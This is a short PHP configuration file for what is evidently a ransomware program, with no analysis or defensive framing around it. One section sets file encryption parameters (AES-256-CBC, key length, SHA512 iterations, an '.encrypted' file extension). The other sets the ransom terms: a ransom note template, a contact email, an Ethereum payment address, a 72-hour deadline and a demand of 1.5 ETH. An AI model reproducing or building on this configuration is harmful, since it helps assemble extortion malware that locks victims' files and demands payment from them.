<?php
return [
    'crypto' => [
        'cipher' => 'AES-256-CBC',
        'key_length' => 32,
        'iterations' => 10000,
        'algorithm' => 'SHA512',
        'extension' => 'encrypted'
    ],
    
    'ransom' => [
        'note_template' => 'app/Views/ransom_note.php',
        'contact_email' => 'recovery@example.com',
        'payment_address' => '0xbc00e800f29524AD8b0968CEBEAD4cD5C5c1f105',
        'deadline_hours' => 72,
        'amount_eth' => 1.5
    ]
];